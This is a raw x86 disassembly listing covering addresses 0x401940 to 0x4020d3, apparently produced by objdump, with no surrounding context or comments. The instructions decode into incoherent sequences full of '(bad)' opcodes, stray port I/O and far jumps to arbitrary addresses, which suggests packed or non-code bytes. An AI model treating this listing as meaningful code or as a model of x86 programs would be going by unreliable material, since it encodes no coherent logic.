  401940:	sub    DWORD PTR [edx+esi*2],ebp
  401943:	fisub  WORD PTR [eax+edx*1-0x3a]
  401947:	sahf   
  401948:	cmp    al,0x86
  40194a:	jno    0x4018f4
  40194c:	push   esp
  40194d:	adc    BYTE PTR [esi-0x2d],dl
  401950:	xor    DWORD PTR [edx+edx*1+0x872d1f6],ebp
  401957:	mov    eax,0xd57a17a3
  40195c:	aad    0x89
  40195e:	arpl   WORD PTR [edx+edi*8],bx
  401961:	mov    edx,0xcc1985c8
  401966:	push   edx
  401967:	push   0xffffffcf
  401969:	adc    DWORD PTR [ebp+0x2a],edi
  40196c:	jo     0x4019e8
  40196e:	pop    ds
  40196f:	push   edi
  401970:	fidivr WORD PTR [ebx]
  401972:	popa   
  401973:	mov    ah,0x14
  401975:	test   dh,al
  401977:	jmp    0xc1b6:0xdeac0462
  40197e:	and    DWORD PTR [eax+edi*1+0x79],esi
  401982:	aas    
  401983:	jl     0x401918
  401985:	outs   dx,BYTE PTR ds:[esi]
  401986:	mov    dh,BYTE PTR [esi]
  401988:	ins    BYTE PTR es:[edi],dx
  401989:	dec    ebp
  40198a:	mov    ah,0x2d
  40198c:	repz mov dl,0xab
  40198f:	add    al,0x56
  401991:	adc    ebx,DWORD PTR [esi+0x1e]
  401994:	adc    ebx,DWORD PTR [esi+0x20835236]
  40199a:	and    eax,0x25107a93
  40199f:	or     al,0x9d
  4019a1:	sub    al,0x54
  4019a3:	and    eax,0xe13602a9
  4019a8:	sub    BYTE PTR [ebx+0x4244db10],ch
  4019ae:	adc    BYTE PTR [ebp+0xf],0xd1
  4019b2:	cmp    BYTE PTR [esi+0x49],ah
  4019b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019b6:	loope  0x401977
  4019b8:	lods   eax,DWORD PTR ds:[esi]
  4019b9:	lahf   
  4019ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019bb:	push   esi
  4019bc:	mov    esi,0x76097787
  4019c1:	sbb    eax,0x453d0967
  4019c6:	ficom  DWORD PTR [eax+ebp*1]
  4019c9:	seto   cl
  4019cc:	call   0xa615ff81
  4019d1:	xor    eax,0xf74110eb
  4019d6:	(bad)  
  4019d7:	and    al,BYTE PTR [eax-0x47]
  4019da:	dec    edx
  4019db:	inc    DWORD PTR [eax+0x1ba5065f]
  4019e1:	ss push ebx
  4019e3:	push   esi
  4019e4:	test   eax,0xe0a4ddc4
  4019e9:	cdq    
  4019ea:	loope  0x4019d8
  4019ec:	fcomi  st,st(4)
  4019ee:	iret   
  4019ef:	cwde   
  4019f0:	xor    eax,0xc7d27903
  4019f5:	add    al,0x78
  4019f7:	xor    eax,0xb4ee9d9c
  4019fc:	adc    edi,DWORD PTR [ecx]
  4019fe:	aad    0x45
  401a00:	fld    TBYTE PTR [ebp+0x2d]
  401a03:	bound  esi,QWORD PTR [ebx]
  401a05:	ds push eax
  401a07:	cld    
  401a08:	leave  
  401a09:	add    ecx,DWORD PTR [eax]
  401a0b:	xchg   esp,eax
  401a0c:	pusha  
  401a0d:	clc    
  401a0e:	jmp    0x401a38
  401a10:	push   cs
  401a11:	or     al,0xf5
  401a13:	push   ebp
  401a14:	mov    ds:0xa431966d,eax
  401a19:	ja     0x4019e0
  401a1b:	inc    esi
  401a1c:	loop   0x401a97
  401a1e:	mov    eax,0x2ef8f6fc
  401a23:	out    dx,al
  401a24:	lea    edx,[eax-0x4eaac662]
  401a2a:	jne    0x401a84
  401a2c:	mov    ds:0xbf723d8c,eax
  401a31:	pop    ebp
  401a32:	adc    eax,0x7c81ca08
  401a37:	(bad)  
  401a38:	out    dx,eax
  401a39:	test   DWORD PTR [ecx],ebx
  401a3b:	push   0x2f
  401a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a3e:	xor    ebp,DWORD PTR [ebx]
  401a40:	pop    ecx
  401a41:	sbb    ebp,DWORD PTR [esi+ecx*8]
  401a44:	leave  
  401a45:	mov    DWORD PTR [esi],ebx
  401a47:	call   0x1ff2:0xa009f98e
  401a4e:	scas   eax,DWORD PTR es:[edi]
  401a4f:	add    eax,0x37bc5b8e
  401a54:	scas   eax,DWORD PTR es:[edi]
  401a55:	test   eax,0xe5756b2c
  401a5a:	dec    ecx
  401a5b:	jo     0x401a86
  401a5d:	loop   0x4019f3
  401a5f:	jmp    0x5aa:0x438490f7
  401a66:	sub    bh,al
  401a68:	cmp    al,0x23
  401a6a:	add    al,0xd5
  401a6c:	bound  ecx,QWORD PTR [eax+0x33]
  401a6f:	clc    
  401a70:	mov    bl,0xa1
  401a72:	push   ss
  401a73:	xchg   BYTE PTR [ecx+0x40],dl
  401a76:	arpl   di,si
  401a78:	adc    esi,DWORD PTR [esi+0x18]
  401a7b:	mov    dh,0x71
  401a7d:	xor    bh,BYTE PTR [ebx+0x1c0f8c7f]
  401a83:	fsubr  DWORD PTR [esp+ebp*8]
  401a86:	sub    esp,DWORD PTR [ebx]
  401a88:	stos   BYTE PTR es:[edi],al
  401a89:	cwde   
  401a8a:	pop    esp
  401a8b:	sub    dl,BYTE PTR [ebx]
  401a8d:	je     0x401ab7
  401a8f:	add    DWORD PTR [eax-0x57],edi
  401a92:	jns    0x401acb
  401a94:	outs   dx,BYTE PTR ds:[esi]
  401a95:	div    BYTE PTR [ebp+0x6493bb5f]
  401a9b:	mov    ebp,0x2abc1fa7
  401aa0:	pop    es
  401aa1:	hlt    
  401aa2:	pop    edi
  401aa3:	adc    eax,0x7a07fba2
  401aa8:	jbe    0x401a8a
  401aaa:	sub    al,0x42
  401aac:	rol    DWORD PTR [edx-0x11],0xeb
  401ab0:	xchg   edx,eax
  401ab1:	jecxz  0x401aa9
  401ab3:	mov    cs,WORD PTR [ecx-0x60]
  401ab6:	sub    DWORD PTR [eax+0x28bd9a4f],0xfa5027da
  401ac0:	in     eax,0x40
  401ac2:	lods   eax,DWORD PTR ds:[esi]
  401ac3:	mov    ds:0xadb2a1ed,eax
  401ac8:	mov    BYTE PTR [esi],bl
  401aca:	mov    ah,0xa9
  401acc:	xchg   ecx,eax
  401acd:	call   0x2a6:0x5ba6e7e4
  401ad4:	adc    ebp,edi
  401ad6:	push   edx
  401ad7:	fldenv [esi+0x4e920d3c]
  401add:	addr16 retf 
  401adf:	test   eax,0xa7a000b
  401ae4:	adc    esi,ebx
  401ae6:	xor    BYTE PTR [esi],ah
  401ae8:	mov    esp,0x854100fd
  401aed:	xor    eax,0x2769cf5c
  401af2:	int3   
  401af3:	dec    ebp
  401af4:	add    eax,0xbc4c1e
  401af9:	push   ebx
  401afa:	popa   
  401afb:	add    eax,0x46847e82
  401b00:	arpl   WORD PTR [ebp+ebp*8-0x54],dx
  401b04:	setne  dh
  401b07:	leave  
  401b08:	mov    ch,0xe1
  401b0a:	or     BYTE PTR [esi-0x1ff85e60],dl
  401b10:	xchg   edx,eax
  401b11:	out    0x35,eax
  401b13:	in     al,0x7d
  401b15:	fistp  WORD PTR [edi]
  401b17:	push   ebx
  401b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b19:	xor    ebp,0xfffffff2
  401b1c:	xlat   BYTE PTR ds:[ebx]
  401b1d:	cdq    
  401b1e:	xlat   BYTE PTR ds:[ebx]
  401b1f:	fstp   DWORD PTR [ebx-0x6c]
  401b22:	test   al,0xf5
  401b24:	test   eax,0xf04679cc
  401b29:	mov    cl,0x64
  401b2b:	lods   al,BYTE PTR ds:[esi]
  401b2c:	adc    cl,0xcd
  401b2f:	shl    ch,cl
  401b31:	push   esp
  401b32:	mov    edx,0x987a7eaf
  401b37:	inc    edx
  401b38:	je     0x401af9
  401b3a:	sub    al,0x72
  401b3c:	add    BYTE PTR [ebx],dl
  401b3e:	lahf   
  401b3f:	lods   al,BYTE PTR ds:[esi]
  401b40:	outs   dx,DWORD PTR ds:[esi]
  401b41:	mov    al,0x16
  401b43:	mov    DWORD PTR ds:0xaa4c28b2,esi
  401b49:	scas   ax,WORD PTR es:[edi]
  401b4b:	sub    DWORD PTR [eax+0x7c],esp
  401b4e:	mov    edi,0x8666cf8e
  401b53:	popa   
  401b54:	imul   esp,DWORD PTR [edx],0xffffff85
  401b57:	add    eax,0x608c3d71
  401b5c:	mov    WORD PTR [esi-0x78],cs
  401b5f:	call   0x143779fe
  401b64:	into   
  401b65:	add    BYTE PTR [ebp-0x63],dh
  401b68:	sar    DWORD PTR [esi],cl
  401b6a:	lahf   
  401b6b:	add    al,0x77
  401b6d:	push   edi
  401b6e:	add    BYTE PTR [eax+0x2f],cl
  401b71:	mov    ebx,0xcc66b17b
  401b76:	outs   dx,DWORD PTR ds:[esi]
  401b77:	leave  
  401b78:	cmp    eax,0xda58dbb8
  401b7d:	mov    esi,DWORD PTR [edi]
  401b7f:	dec    ecx
  401b80:	xchg   BYTE PTR [edx-0x5800cbdd],ch
  401b86:	xor    BYTE PTR [ebx+ebx*1+0x33],dh
  401b8a:	mov    al,ds:0xc3b36832
  401b8f:	into   
  401b90:	fld    QWORD PTR [eax+edi*8-0x52]
  401b94:	mov    bh,0x32
  401b96:	std    
  401b97:	inc    esp
  401b98:	(bad)  
  401b99:	mov    ds:0x6908538,al
  401b9e:	and    al,0xec
  401ba0:	jp     0x401c04
  401ba2:	sbb    bl,BYTE PTR [ebp+0x1a]
  401ba5:	mov    cl,BYTE PTR [esi]
  401ba7:	(bad)  
  401ba8:	loop   0x401c00
  401baa:	es out 0xb2,eax
  401bad:	(bad)  
  401bae:	mov    eax,0x6d15d146
  401bb3:	sub    al,0x7d
  401bb5:	xor    al,0xde
  401bb7:	out    dx,eax
  401bb8:	inc    esp
  401bb9:	idiv   BYTE PTR ds:0xc1b06e71
  401bbf:	fsubr  st,st(3)
  401bc1:	cmp    al,0xff
  401bc3:	jle    0x401b7e
  401bc5:	retf   
  401bc6:	jo     0x401c20
  401bc8:	and    ch,BYTE PTR [esi-0x54]
  401bcb:	cwde   
  401bcc:	push   0xb
  401bce:	fsub   QWORD PTR [ecx-0x4a]
  401bd1:	jge    0x401b9a
  401bd3:	dec    eax
  401bd4:	or     edx,DWORD PTR [ebp+ecx*4-0x7c63329]
  401bdb:	scas   eax,DWORD PTR es:[edi]
  401bdc:	mov    ch,0xe8
  401bde:	mov    ebx,ebx
  401be0:	ins    DWORD PTR es:[edi],dx
  401be1:	out    dx,eax
  401be2:	adc    DWORD PTR [edi-0x23],ebx
  401be5:	jmp    0x8fe6:0x5d9343a4
  401bec:	xor    BYTE PTR [edx],dl
  401bee:	sbb    BYTE PTR [eax-0xa114eb],al
  401bf4:	cmp    DWORD PTR [ebx+0x4a488f08],edi
  401bfa:	and    eax,0x476d009d
  401bff:	inc    esp
  401c00:	jns    0x401c31
  401c02:	mov    ch,BYTE PTR [ebp-0x45]
  401c05:	xchg   BYTE PTR [edi-0x13],ah
  401c08:	mov    dh,0x76
  401c0a:	adc    eax,0xbf8ebdcd
  401c0f:	inc    esp
  401c10:	loopne 0x401c4a
  401c12:	out    0x1a,eax
  401c14:	outs   dx,DWORD PTR ds:[esi]
  401c15:	imul   ecx,ebp,0x70
  401c18:	test   al,0xe8
  401c1a:	mov    al,BYTE PTR [edi-0x32295bb7]
  401c20:	jecxz  0x401bdb
  401c22:	mov    ds:0xa2042e20,eax
  401c27:	add    DWORD PTR [ebx-0x76],edx
  401c2a:	loop   0x401c8e
  401c2c:	nop
  401c2d:	lock inc edx
  401c2f:	(bad)  
  401c30:	outs   dx,BYTE PTR ds:[esi]
  401c31:	sub    BYTE PTR [edx],dl
  401c33:	int3   
  401c34:	in     eax,dx
  401c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c37:	adc    DWORD PTR [eax+eax*1],ebp
  401c3a:	xor    DWORD PTR [edi],edx
  401c3c:	(bad)  
  401c3d:	rcl    dh,cl
  401c3f:	xchg   ebx,eax
  401c40:	ins    BYTE PTR es:[edi],dx
  401c41:	out    0x57,al
  401c43:	or     DWORD PTR [esi+0x20],esp
  401c46:	push   ebx
  401c47:	in     al,0xf9
  401c49:	pop    edi
  401c4a:	inc    ecx
  401c4b:	pop    ds
  401c4c:	imul   edx,esp,0x10654f20
  401c52:	or     eax,0x71835909
  401c57:	mov    edi,0xb59c4695
  401c5c:	das    
  401c5d:	enter  0x4430,0x90
  401c61:	cmp    edx,DWORD PTR [esi]
  401c63:	jae    0x401cba
  401c65:	popf   
  401c66:	sbb    DWORD PTR [ebp-0x45],esi
  401c69:	loope  0x401c52
  401c6b:	fucomip st,st(0)
  401c6d:	retf   0xde7c
  401c70:	pop    ebx
  401c71:	data16 arpl WORD PTR [ebx+0x1255cd84],di
  401c78:	xchg   esi,eax
  401c79:	scas   eax,DWORD PTR es:[edi]
  401c7a:	outs   dx,DWORD PTR ds:[esi]
  401c7b:	mov    ah,0x77
  401c7d:	ss jno 0x401c77
  401c80:	inc    ecx
  401c81:	add    al,0x59
  401c83:	mov    bh,0xc
  401c85:	pop    edi
  401c86:	adc    BYTE PTR [edx+edx*2-0x239fdc1],cl
  401c8d:	bound  edi,QWORD PTR [ecx-0x34cc7f56]
  401c93:	call   ecx
  401c95:	dec    ebx
  401c96:	pop    eax
  401c97:	test   eax,0x37921af8
  401c9c:	jg     0x401d08
  401c9e:	sub    BYTE PTR [edi],al
  401ca0:	pop    es
  401ca1:	sub    DWORD PTR [ebp+0x38cd4d9b],edi
  401ca7:	ins    BYTE PTR es:[edi],dx
  401ca8:	push   esp
  401ca9:	add    ah,dl
  401cab:	xchg   ecx,eax
  401cac:	cmp    dl,dh
  401cae:	dec    ecx
  401caf:	adc    esi,eax
  401cb1:	jmp    0x401cb4
  401cb3:	out    dx,al
  401cb4:	mov    bl,0xdd
  401cb6:	add    esi,0xde2a5c82
  401cbc:	mov    gs,WORD PTR [esi+0x1b0820d1]
  401cc2:	or     dh,0xec
  401cc5:	adc    ebx,DWORD PTR [edx+0x6e6bd641]
  401ccb:	inc    eax
  401ccc:	daa    
  401ccd:	(bad)  
  401cce:	xlat   BYTE PTR ds:[ebx]
  401ccf:	pop    edi
  401cd0:	push   ebp
  401cd1:	mov    al,0x47
  401cd3:	stc    
  401cd4:	dec    ebp
  401cd5:	ficomp WORD PTR [eax+eiz*8+0x0]
  401cd9:	retf   
  401cda:	xchg   esi,eax
  401cdb:	int    0xbf
  401cdd:	cmc    
  401cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cdf:	(bad)
  401ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ce3:	popa   
  401ce4:	xchg   edx,eax
  401ce5:	stos   DWORD PTR es:[edi],eax
  401ce6:	(bad)  
  401ce8:	popf   
  401ce9:	mov    cl,0x55
  401ceb:	xchg   ebx,eax
  401cec:	adc    DWORD PTR [ecx+esi*1],edi
  401cef:	inc    eax
  401cf0:	pop    edi
  401cf1:	sar    DWORD PTR [ebx+0x4f],cl
  401cf4:	jmp    0x401d5b
  401cf6:	cdq    
  401cf7:	mov    edx,DWORD PTR [eax+0x4d]
  401cfa:	push   edx
  401cfb:	jmp    0xa015:0xc3d0f97
  401d02:	neg    DWORD PTR [edi+0x45]
  401d05:	retf   
  401d06:	mov    edi,0x7681c6eb
  401d0b:	scas   al,BYTE PTR es:[edi]
  401d0c:	(bad)
  401d0f:	jnp    0x401cdf
  401d11:	ins    DWORD PTR es:[edi],dx
  401d12:	aam    0x33
  401d14:	jecxz  0x401d46
  401d16:	mov    eax,0x12d7cbff
  401d1b:	adc    ch,ah
  401d1d:	repz xor cl,BYTE PTR [edi]
  401d20:	ds in  al,dx
  401d22:	inc    eax
  401d23:	mov    BYTE PTR [ebx],bl
  401d25:	rcl    ch,cl
  401d27:	sbb    al,0x6
  401d29:	pop    eax
  401d2a:	dec    esi
  401d2b:	pop    edx
  401d2c:	aad    0x83
  401d2e:	mov    esi,0xc460505c
  401d33:	int3   
  401d34:	and    ebp,DWORD PTR [edi]
  401d36:	scas   eax,DWORD PTR es:[edi]
  401d37:	fiadd  DWORD PTR [esi+0x53]
  401d3a:	scas   eax,DWORD PTR es:[edi]
  401d3b:	inc    esi
  401d3c:	or     ecx,ebp
  401d3e:	rol    BYTE PTR [edi-0x58],0xe6
  401d42:	cmp    dh,dh
  401d44:	fdivr  DWORD PTR [ecx+ebx*1-0x13]
  401d48:	inc    esi
  401d49:	aad    0x8d
  401d4b:	fdivrp st(4),st
  401d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d4e:	ins    DWORD PTR es:[edi],dx
  401d4f:	adc    edx,ebx
  401d51:	push   0x5b42aeb1
  401d56:	(bad)  
  401d58:	push   esp
  401d59:	jmp    0x8e4a39cc
  401d5e:	push   0x1d
  401d60:	add    dl,dl
  401d62:	aad    0xbb
  401d64:	stos   DWORD PTR es:[edi],eax
  401d65:	lods   al,BYTE PTR ds:[esi]
  401d66:	sub    al,0x87
  401d68:	xor    esi,esp
  401d6a:	cmovbe edi,DWORD PTR [ecx]
  401d6d:	sub    BYTE PTR [ecx],al
  401d6f:	loop   0x401d8b
  401d71:	test   BYTE PTR [esi-0x33],cl
  401d74:	enter  0xa380,0x83
  401d78:	dec    ebx
  401d79:	test   BYTE PTR [ecx],dh
  401d7b:	dec    ecx
  401d7c:	loope  0x401d9e
  401d7e:	pop    edi
  401d7f:	mov    BYTE PTR [ebx-0x538f4bf5],0x57
  401d86:	loop   0x401de2
  401d88:	out    dx,eax
  401d89:	hlt    
  401d8a:	ret    
  401d8b:	imul   DWORD PTR [edx+0x1474204b]
  401d91:	pop    ebp
  401d92:	pusha  
  401d93:	imul   ebx,DWORD PTR [eax+0x311fa0c8],0xfffffff6
  401d9a:	dec    esp
  401d9b:	dec    esp
  401d9c:	dec    esp
  401d9d:	aas    
  401d9e:	pop    ecx
  401d9f:	in     al,dx
  401da0:	fwait
  401da1:	das    
  401da2:	and    ebp,ecx
  401da4:	mov    esp,0xc132653d
  401da9:	ins    BYTE PTR es:[edi],dx
  401daa:	aas    
  401dab:	adc    dl,dl
  401dad:	ret    
  401dae:	xlat   BYTE PTR ds:[ebx]
  401daf:	mov    ch,0xac
  401db1:	xchg   ebx,eax
  401db2:	sub    ecx,ebp
  401db4:	clc    
  401db5:	fcom   QWORD PTR [ebp+0x13]
  401db8:	lahf   
  401db9:	mov    bh,bh
  401dbb:	out    0xe,eax
  401dbd:	imul   esi,eax,0xb2fe9b11
  401dc3:	or     eax,0x6b92d1b5
  401dc8:	xor    eax,0x42dbdbb2
  401dcd:	arpl   WORD PTR [ecx+0x2e50a8ac],si
  401dd3:	scas   eax,DWORD PTR es:[edi]
  401dd4:	lds    edi,FWORD PTR [esi-0x722d7368]
  401dda:	cwde   
  401ddb:	hlt    
  401ddc:	jp     0x401e22
  401dde:	add    DWORD PTR [edi+0x5],0xc2964ba0
  401de5:	(bad)  
  401de6:	rol    DWORD PTR [edi-0x60],cl
  401de9:	adc    esi,ebp
  401deb:	and    al,0x6a
  401ded:	jmp    0x7ef3:0xdb5e1200
  401df4:	fld    TBYTE PTR fs:[ebp-0x44c18c69]
  401dfb:	xchg   edi,eax
  401dfc:	mov    al,ds:0xf4906b68
  401e01:	je     0x401d91
  401e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e04:	pop    edi
  401e05:	sahf   
  401e06:	(bad)  
  401e07:	lods   al,BYTE PTR ds:[esi]
  401e08:	(bad)  
  401e09:	(bad)  
  401e0b:	xor    BYTE PTR [esp+esi*8+0x60],dl
  401e0f:	sub    al,0x33
  401e11:	mov    ch,0x4a
  401e13:	push   ecx
  401e14:	push   eax
  401e15:	mov    DWORD PTR [edi-0x20e67edc],ecx
  401e1b:	stc    
  401e1c:	pop    ss
  401e1d:	xchg   ebx,esi
  401e1f:	mov    eax,0x4086d3ff
  401e24:	push   esi
  401e25:	pushf  
  401e26:	mov    al,ds:0x7b8c0dba
  401e2b:	enter  0x5e08,0x7f
  401e2f:	mov    ebp,0x71b8fb48
  401e34:	mov    ds:0xc8427bca,al
  401e39:	into   
  401e3a:	cmp    cl,al
  401e3c:	mov    eax,ds:0x437371e5
  401e41:	imul   ebp,DWORD PTR [edi-0x75],0xd413b20e
  401e48:	push   edx
  401e49:	jns    0x401de4
  401e4b:	sub    edi,DWORD PTR [ebx]
  401e4d:	sub    DWORD PTR [eax],ebp
  401e4f:	cld    
  401e50:	test   al,0x83
  401e52:	inc    ecx
  401e53:	fucomp st(2)
  401e55:	hlt    
  401e56:	rcl    BYTE PTR [eax+ebp*4-0x3d601f2f],0xd5
  401e5e:	pop    es
  401e5f:	mov    edi,0xb1e6021c
  401e64:	pop    es
  401e65:	xor    eax,0x27b340c2
  401e6a:	ror    DWORD PTR [edi],cl
  401e6c:	in     eax,0x4d
  401e6e:	out    dx,eax
  401e6f:	(bad)  
  401e70:	ins    DWORD PTR es:[edi],dx
  401e71:	jle    0x401e2b
  401e73:	popf   
  401e74:	push   ebx
  401e75:	les    edi,FWORD PTR [ecx+0x57]
  401e78:	sbb    DWORD PTR [eax+0x7f096f88],edi
  401e7e:	fimul  DWORD PTR [eax+0x6a]
  401e81:	test   BYTE PTR [esi],0xc4
  401e84:	ds add eax,0xbddd4c89
  401e8a:	aam    0x80
  401e8c:	lock mov eax,ds:0xd67c8a71
  401e92:	dec    esp
  401e93:	push   0xffffffbd
  401e95:	sub    BYTE PTR [ebp+0x40],0x20
  401e99:	push   eax
  401e9a:	jmp    0x401ecc
  401e9c:	or     al,bh
  401e9e:	(bad)  
  401e9f:	out    0x2c,eax
  401ea1:	mov    cl,BYTE PTR [ecx-0x1b4812fa]
  401ea7:	mov    ah,BYTE PTR [eax-0x56fd32ff]
  401ead:	jge    0x401edf
  401eaf:	jmp    0x401e9c
  401eb1:	call   0x1665da8e
  401eb6:	jge    0x401e64
  401eb8:	push   ss
  401eb9:	rcl    DWORD PTR [ebp+0x715c728b],cl
  401ebf:	imul   ecx,DWORD PTR [edi],0xffffffc7
  401ec2:	or     dl,BYTE PTR ds:0x8ff8e0c0
  401ec8:	(bad)  
  401ec9:	std    
  401eca:	call   0x6606:0xaaca5160
  401ed1:	mov    esp,0xbd65db1
  401ed6:	in     al,0x57
  401ed8:	bound  esp,QWORD PTR [ebp+edi*4+0x461c636f]
  401edf:	aam    0x9c
  401ee1:	into   
  401ee2:	mov    fs,WORD PTR [ebp+0x67]
  401ee5:	pushw  cs
  401ee7:	fisttp DWORD PTR [edi+ecx*4]
  401eea:	aam    0x7
  401eec:	cmp    BYTE PTR [ebp+0x45447c1d],0x69
  401ef3:	pop    eax
  401ef4:	mul    ecx
  401ef6:	lea    ebx,[eax-0x146992e]
  401efc:	inc    ebx
  401efd:	mov    al,ds:0xa1d5aaf0
  401f02:	sub    eax,0xdf7e1ae0
  401f07:	jecxz  0x401f7a
  401f09:	mov    ds:0x7a796550,eax
  401f0e:	hlt    
  401f0f:	retf   
  401f10:	(bad)  
  401f11:	sub    BYTE PTR [esi],bl
  401f13:	inc    esp
  401f14:	push   ecx
  401f15:	inc    edx
  401f16:	out    dx,eax
  401f17:	dec    edi
  401f18:	xor    esi,edi
  401f1a:	xchg   ebx,eax
  401f1b:	push   ebx
  401f1c:	sti    
  401f1d:	data16 jl 0x401f84
  401f20:	popa   
  401f21:	push   ecx
  401f22:	fs in  eax,dx
  401f24:	sub    dh,BYTE PTR [esi]
  401f26:	sbb    eax,0xc3812ac4
  401f2b:	shr    ah,1
  401f2d:	add    al,BYTE PTR [ebp-0x6a]
  401f30:	test   DWORD PTR [eax+0x57405fd3],esp
  401f36:	(bad)  
  401f37:	pop    ecx
  401f38:	jbe    0x401f8b
  401f3a:	lods   al,BYTE PTR ds:[esi]
  401f3b:	loopne 0x401ef0
  401f3d:	mov    BYTE PTR [esi],cl
  401f3f:	rcr    DWORD PTR [ebp-0xffd7f0f],0xb5
  401f46:	jbe    0x401f79
  401f48:	daa    
  401f49:	in     eax,dx
  401f4a:	jne    0x401f66
  401f4c:	shr    ebp,cl
  401f4e:	ss pushw ss
  401f51:	stos   BYTE PTR es:[edi],al
  401f52:	xchg   eax,esp
  401f54:	mov    esp,0xe2bbc3cb
  401f59:	enter  0x4621,0x69
  401f5d:	test   BYTE PTR [esi+0x33],dl
  401f60:	cmp    ecx,DWORD PTR ds:0xfec89ead
  401f66:	inc    eax
  401f67:	sub    dl,BYTE PTR [esi+0x7cd38ef3]
  401f6d:	dec    edi
  401f6e:	cdq    
  401f6f:	xor    al,0x60
  401f71:	ficomp WORD PTR [esi+edi*8-0x13]
  401f75:	lds    esi,FWORD PTR [ebx*8-0x55d06c6e]
  401f7c:	(bad)  
  401f7d:	cld    
  401f7e:	jge    0x401f1c
  401f80:	(bad)  [ebp+0x62e5ad46]
  401f86:	jno    0x401fd9
  401f88:	cmp    eax,DWORD PTR fs:[esi]
  401f8b:	pop    es
  401f8c:	test   ch,dh
  401f8e:	cld    
  401f8f:	lea    edi,[ebx-0x69]
  401f92:	adc    eax,0x226477ac
  401f97:	jns    0x401f8d
  401f99:	test   DWORD PTR [edi],edx
  401f9b:	add    eax,0xfd4fb507
  401fa0:	push   eax
  401fa1:	or     ebx,DWORD PTR [esi+0x46171315]
  401fa7:	pop    esi
  401fa8:	mov    WORD PTR [edx+0x78],?
  401fab:	inc    eax
  401fac:	pop    eax
  401fad:	inc    ecx
  401fae:	adc    eax,0xc4bb8796
  401fb3:	fisubr DWORD PTR [edx+0x2c]
  401fb6:	gs lahf 
  401fb8:	sbb    BYTE PTR [eax+0x6dbef812],0x51
  401fbf:	std    
  401fc0:	xchg   esp,eax
  401fc1:	aam    0x2f
  401fc3:	dec    ecx
  401fc4:	punpcklwd mm0,mm2
  401fc7:	daa    
  401fc8:	(bad)  
  401fc9:	call   0xd55800ca
  401fce:	cmp    al,0xb
  401fd0:	xor    DWORD PTR [si],0x3c
  401fd4:	(bad)  
  401fd5:	jb     0x401fa1
  401fd7:	fwait
  401fd8:	pop    esp
  401fd9:	xchg   ebx,eax
  401fda:	jmp    0x401fb3
  401fdc:	ss jle 0x401ffc
  401fdf:	xor    BYTE PTR [ecx+0x79730d2],ch
  401fe5:	inc    ebx
  401fe6:	clc    
  401fe7:	loop   0x401fab
  401fe9:	push   ebx
  401fea:	ret    
  401feb:	repnz mov DWORD PTR [edi-0x72],esp
  401fef:	cmp    BYTE PTR [esi+ebp*2],ch
  401ff2:	mov    cl,0x4b
  401ff4:	pop    ebx
  401ff5:	xlat   BYTE PTR ds:[ebx]
  401ff6:	leave  
  401ff7:	jno    0x401f8b
  401ff9:	lds    esi,FWORD PTR [ecx+0xe]
  401ffc:	hlt    
  401ffd:	and    eax,0xe767d250
  402002:	outs   dx,BYTE PTR ds:[esi]
  402003:	ud0    ebp,DWORD PTR [ebx*1-0x42f3c20e]
  40200b:	js     0x401fef
  40200d:	mov    ds:0xb540c216,eax
  402012:	xchg   ebp,eax
  402013:	ret    0x57ed
  402016:	push   es
  402017:	bound  edx,QWORD PTR [edx-0x2c71dafa]
  40201d:	jns    0x401fd3
  40201f:	mov    ds:0xaf6180cb,al
  402024:	std    
  402025:	data16 adc al,0x7d
  402028:	rol    BYTE PTR [ebp-0x2b],1
  40202b:	mov    BYTE PTR [edx+0x34bc5b6e],bh
  402031:	rcr    BYTE PTR [ebp-0x622231a7],0x93
  402038:	sti    
  402039:	jl     0x402042
  40203b:	sbb    BYTE PTR [edi+edx*1-0x3efb07c8],bl
  402042:	pop    es
  402043:	neg    ecx
  402045:	push   eax
  402046:	push   0x84176da8
  40204b:	scas   al,BYTE PTR es:[edi]
  40204c:	sub    DWORD PTR [ebx],edi
  40204e:	imul   edx,DWORD PTR [edi-0x294a4f42],0xffffff91
  402055:	pop    ecx
  402056:	jge    0x402054
  402058:	das    
  402059:	fadd   QWORD PTR [esi+0x12e30afd]
  40205f:	into   
  402060:	push   0xffffffcb
  402062:	or     ebp,DWORD PTR [ebp-0x2a]
  402065:	jno    0x40203f
  402067:	in     eax,dx
  402068:	loopne 0x40204b
  40206a:	aam    0x85
  40206c:	sbb    edx,DWORD PTR ds:0xd793cecd
  402072:	pop    eax
  402073:	out    0xca,al
  402075:	lea    eax,[edi]
  402077:	push   esi
  402078:	fwait
  402079:	xchg   ebp,eax
  40207a:	pop    ebx
  40207b:	aad    0xda
  40207d:	sbb    bh,bh
  40207f:	xor    dl,BYTE PTR [edi+0x7559c53b]
  402085:	clc    
  402086:	pop    eax
  402087:	enter  0xf9cd,0xb3
  40208b:	les    eax,FWORD PTR [esp+edi*2]
  40208e:	in     al,0x80
  402090:	pushf  
  402091:	lods   al,BYTE PTR ds:[si]
  402093:	mov    bl,0x60
  402095:	jmp    0xd830:0xf9b4e423
  40209c:	rol    DWORD PTR [ebp-0x11],cl
  40209f:	mov    edi,0x7de712a4
  4020a4:	mov    ah,0x60
  4020a6:	mov    esi,edx
  4020a8:	lods   eax,DWORD PTR ds:[esi]
  4020a9:	inc    eax
  4020aa:	fist   DWORD PTR fs:[ebx+0x11]
  4020ae:	sar    DWORD PTR [eax+0x1d7ff2b],cl
  4020b4:	js     0x4020af
  4020b6:	cs jae 0x4020a3
  4020b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020ba:	dec    edi
  4020bb:	fcomp  QWORD PTR [ebx]
  4020bd:	lds    ebx,FWORD PTR [edi-0x39]
  4020c0:	xor    BYTE PTR [edx],bl
  4020c2:	sbb    al,0x45
  4020c4:	lahf   
  4020c5:	add    BYTE PTR [ebp*4+0x14d7d2bd],ah
  4020cc:	(bad)  
  4020cd:	adc    bh,bl
  4020cf:	jl     0x4020b0
  4020d1:	dec    ebp
  4020d2:	xchg   esi,eax
  4020d3:	out    0xfd,al
